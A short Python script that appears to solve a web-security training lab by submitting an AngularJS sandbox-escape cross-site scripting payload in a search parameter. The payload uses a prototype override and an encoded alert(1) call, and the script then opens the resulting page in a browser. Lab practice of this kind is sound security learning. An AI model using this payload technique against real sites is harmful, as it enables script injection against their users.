import requests
import webbrowser

base_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
payload = "1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"
final_url = f"{base_url}?search={payload}"

response = requests.get(url=final_url)

print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print(response.url)
    webbrowser.open(response.url)
else:
    print("Something went wrong.")